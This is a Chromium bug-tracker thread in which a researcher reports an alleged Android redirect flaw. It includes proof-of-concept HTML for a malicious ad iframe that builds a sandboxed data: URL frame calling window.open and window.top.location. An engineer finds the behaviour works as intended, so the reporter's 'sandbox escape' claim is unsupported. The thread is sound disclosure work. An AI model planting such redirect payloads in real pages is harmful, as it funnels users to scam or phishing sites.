@@ -1,0 +1,235 @@
+Issue ID: 458206060
+
+Author: ch...@google.com
+<h1>Steps to reproduce the problem</h1>
+<ul>
+<li>Publisher page embeds a cross-origin iframe pointing to the attacker domain. (<a href="https://ubiquitous-stardust-64024e.netlify.app/index.html" data-b-widget="url" data-b-original-href="https://ubiquitous-stardust-64024e.netlify.app/index.html" data-b-redirected-href="https://www.google.com/url?q=https://ubiquitous-stardust-64024e.netlify.app/index.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1LI3uS2XPogOZ7k0_ehzqu">https://ubiquitous-stardust-64024e.netlify.app/index.html</a>)</li>
+<li>Attacker iframe dynamically creates a nested iframe using a data:text/html;base64,... URL and sets sandbox=&quot;allow-top-navigation allow-scripts allow-popups&quot;.
+(<a href="https://attacker.hackerbro.net/maliciousadd.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/maliciousadd.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/maliciousadd.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2Py5qc2L2Tuiw5ZpnH3IB0">https://attacker.hackerbro.net/maliciousadd.html</a>)</li>
+<li>The nested/frame content attempts a top-level navigation, Chrome Browser Version 142.0.7444.48 for Android performs the top-level navigation automatically (no user gesture required).</li>
+</ul>
+<p>Publisher: <a href="https://ubiquitous-stardust-64024e.netlify.app/index.html" data-b-widget="url" data-b-original-href="https://ubiquitous-stardust-64024e.netlify.app/index.html" data-b-redirected-href="https://www.google.com/url?q=https://ubiquitous-stardust-64024e.netlify.app/index.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1LI3uS2XPogOZ7k0_ehzqu">https://ubiquitous-stardust-64024e.netlify.app/index.html</a>
+Attacker: <a href="https://attacker.hackerbro.net/malicious.html" data-b-widget="url" data-b-original-href="https://attacker.hackerbro.net/malicious.html" data-b-redirected-href="https://www.google.com/url?q=https://attacker.hackerbro.net/malicious.html&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2MurrdFgMHU6XjV9-8I2WW">https://attacker.hackerbro.net/malicious.html</a></p>
+<h2>Publisher.html:</h2>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Publisher Site&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Main Publisher Site&lt;/h1&gt;    
+    &lt;!-- Cross-origin iframe pointing to advertiser domain --&gt;
+    &lt;iframe src=&quot;https://attacker.hackerbro.net/maliciousadd.html&quot;&gt;&lt;/iframe&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Maliciousadd.html:</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Ad Content&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script type=&quot;text/javascript&quot;&gt;
+        // Open blank popup then navigate
+        var x = &#39;&lt;html&gt;&lt;body&gt;&lt;script&gt;var popup = window.open(&quot;&quot;, &quot;remoteWin&quot;, &quot;width=480,height=320&quot;); if(popup) { popup.location.href = &quot;https://google.com&quot;; } window.top.location = &quot;https://google.com&quot;;&lt;\/script&gt;&lt;/body&gt;&lt;/html&gt;&#39;;
+        var bs64 = btoa(x);
+        document.write(&#39;&lt;iframe sandbox=&quot;allow-top-navigation allow-scripts allow-popups&quot; src=&quot;data:text/html;base64,&#39; + bs64 + &#39;&quot;&gt;&lt;/iframe&gt;&#39;);
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1>Problem Description</h1>
+<h2>Hi Team,</h2>
+<ul>
+<li>During my research on Chrome Browser Version 142.0.7444.48 for Android, I found a cross-origin ad/iframe chain was observed that resulted in an automatic top-level redirect without user interaction. The redirect was triggered from an iframe hosted on an attacker-controlled domain via window.open() and caused the publisher page to navigate to an external site (top level navigation).</li>
+</ul>
+<h2>Impact:</h2>
+<ul>
+<li>Automatic, silent redirection of users to external/malicious sites.</li>
+<li>Bypasses browser popup/redirect protections and can be used in malvertising/phishing chains.</li>
+<li>High potential for traffic funneling to malware or scam pages.</li>
+</ul>
+<h2>Expected behaviour:</h2>
+<ul>
+<li>Top-level navigation from sandboxed or cross-origin frames should be blocked unless initiated by an explicit user gesture or unless the full ancestor chain explicitly permits navigation.</li>
+</ul>
+<h2>Recommendation:</h2>
+<ul>
+<li>Implement ancestor-aware navigation checks similar to Chromium’s fix: ensure allow-top-navigation on a sandboxed iframe does not override restrictions imposed by ancestor frames and window.open.</li>
+</ul>
+<h2>References:</h2>
+<p><a href="https://issues.chromium.org/issues/40053780" data-b-widget="issue-reference" data-b-issue-id="40053780">https://issues.chromium.org/issues/40053780</a>
+<a href="https://issues.chromium.org/issues/41493458" data-b-widget="issue-reference" data-b-issue-id="41493458">https://issues.chromium.org/issues/41493458</a></p>
+<h1>Summary</h1>
+<p>Cross-origin sandbox escape allows unauthorized top-level navigation Chrome for Android</p>
+<h1>Custom Questions</h1>
+<h4>Reporter credit:</h4>
+<p>Manojkumar Jaganathan (<a href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-widget="url" data-b-original-href="https://www.linkedin.com/in/manojkumar-j-7ba35b202/" data-b-redirected-href="https://www.google.com/url?q=https://www.linkedin.com/in/manojkumar-j-7ba35b202/&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3yGYjbAkUBzQSSXE1f3oDi">https://www.linkedin.com/in/manojkumar-j-7ba35b202/</a>) Aka TheWhiteEvil (<a href="https://hackerone.com/the-white-evil" data-b-widget="url" data-b-original-href="https://hackerone.com/the-white-evil" data-b-redirected-href="https://www.google.com/url?q=https://hackerone.com/the-white-evil&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw2KREOzR1YCNOgjcFd19Ov8">https://hackerone.com/the-white-evil</a>) with HackerBro Technologies</p>
+<h1>Additional Data</h1>
+<p>Category: Security <br>
+Chrome Channel: Not sure <br>
+Regression: N/A \</p>
+
+Author: ch...@google.com
+google_domain
+
+Author: bu...@gmail.com
+Cross-origin sandbox escape allows unauthorized top-level navigation Chrome for Android
+
+Author: bu...@gmail.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: bu...@gmail.com
+public_non_google
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: bu...@gmail.com
+<p>This issue is not reproducible on Chrome for macOS. <code>window.open()</code> calls (e.g., opening google.com) are blocked (PoC video attached). However, it is reproducible on Chrome for Android.</p>
+
+Author: bu...@gmail.com
+TkRVNE1qQTJNRFl3TFRjd056Y3lNakkxTFRJME1qUXhPRFUz
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: bu...@gmail.com
+<p>Important note: This issue arises due to window.open() a new pop up window.</p>
+
+Author: ma...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ma...@google.com
+googlers_unrestricted
+
+Author: ma...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: ma...@google.com
+type.googleapis.com/google.protobuf.StringValue
+
+Author: ma...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: pe...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.CustomFieldValue
+
+Author: pe...@google.com
+google_domain
+
+Author: ma...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: al...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: al...@chromium.org
+public_non_google
+
+Author: av...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: av...@chromium.org
+public_non_google
+
+Author: cr...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cr...@chromium.org
+public_non_google
+
+Author: cs...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: cs...@chromium.org
+public_non_google
+
+Author: dc...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: dc...@chromium.org
+public_non_google
+
+Author: do...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: do...@chromium.org
+public_non_google
+
+Author: jk...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: jk...@chromium.org
+public_non_google
+
+Author: lb...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: lb...@google.com
+googlers_unrestricted
+
+Author: mu...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: mu...@chromium.org
+public_non_google
+
+Author: sh...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: sh...@chromium.org
+public_non_google
+
+Author: ma...@google.com
+TVRrNE1tTXdNamszT0RZek9USm1OVE16TlRBeFkySXpZVFptTURobU1EQT0=
+
+Author: CCing folks from 41493458. lbrady@ are you the right owner for this?
+TVRrNE1tTXdNamszT0RZek9USm1OVE16TlRBeFkySXpZVFptTURobU1EQT0=
+
+Author: ch...@google.com
+<p>Setting Priority to P2 to match Severity s3. If this is incorrect, please reset the priority. The automation bot account won&#39;t make this change again.</p>
+
+Author: lb...@google.com
+<p>I can take a look at this. I probably won&#39;t be able to get to it for a couple weeks, so if it gets bumped up in priority feel free to reassign.</p>
+
+Author: lb...@google.com
+<p>This seems to be working as intended. It&#39;s a bit hard to distinguish which navigation is which, but if you replace one of the <code>google.com</code> navigations in <code>Maliciousadd.html</code> with some other site, it&#39;ll become more clear what&#39;s happening.</p>
+<p>Here&#39;s my understanding of what the repro is doing (with generic URLs to make it easier to follow):</p>
+<ol>
+<li>Navigate to an <code>A.com</code> page.</li>
+<li>The <code>A.com</code> page embeds a <code>B.com</code> iframe.</li>
+<li>The page in the <code>B.com</code> iframe embeds a <code>data:url</code> iframe.</li>
+<li>The <code>data:url</code> iframe opens an <code>about:blank</code> popup window.</li>
+<li>The <code>data:url</code> iframe attempts to navigate the <code>about:blank</code> popup window to <code>C.com</code>.
+<ul>
+<li>This succeeds. It&#39;s fine for popups to be navigated by their openers, and we don&#39;t subject those to user activation checks. It looks like it fails on desktop because <a href="https://google.com" data-b-widget="url" data-b-original-href="https://google.com" data-b-redirected-href="https://www.google.com/url?q=https://google.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0VT8wnjtPCJ_ZzcGf2doE0">https://google.com</a> has some server-side policy related to being loaded in a popup window that is failing (Android opens popups in new tabs so this doesn&#39;t happen there). Loading something like <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a> or <a href="https://something.com" data-b-widget="url" data-b-original-href="https://something.com" data-b-redirected-href="https://www.google.com/url?q=https://something.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3Bl8lZocSXsf-xqNmcJyzP">https://something.com</a> does result in a successful navigation.</li>
+</ul>
+</li>
+<li>The <code>data:url</code> iframe attempts to do a top-level navigation to <code>D.com</code>.
+<ul>
+<li>That fails the framebusting checks with the following error: <code>The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.</code> This is also expected.</li>
+</ul>
+</li>
+</ol>
+<p>After all of this, you&#39;ll be left with the following:</p>
+<ul>
+<li>an <code>A.com</code> page</li>
+<li>a <code>B.com</code> iframe</li>
+<li>a <code>data:url</code> iframe</li>
+<li>a popup window navigated to <code>C.com</code></li>
+</ul>
+<p>The attempted navigation to <code>D.com</code> is stopped, which means the intervention is still working. The navigation to <code>C.com</code> is not part of the threat model for these interventions. If you look at the Android repro video at around 0:23, you&#39;ll see the publisher site was not navigated away, and instead the popup became the foreground tab and then <strong>that</strong> was navigated. If <code>A.com</code> had been successfully navigated away, then this would&#39;ve been a bug. But since <code>A.com</code> was untouched, everything seems to be working as expected.</p>
+
+Author: lb...@google.com
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ch...@google.com
+<p>This bug has been closed for more than 14 weeks. Removing issue access restrictions.</p>
+
+Author: ch...@google.com
+type.googleapis.com/google.devtools.issuetracker.v1.IssueAccessLimit
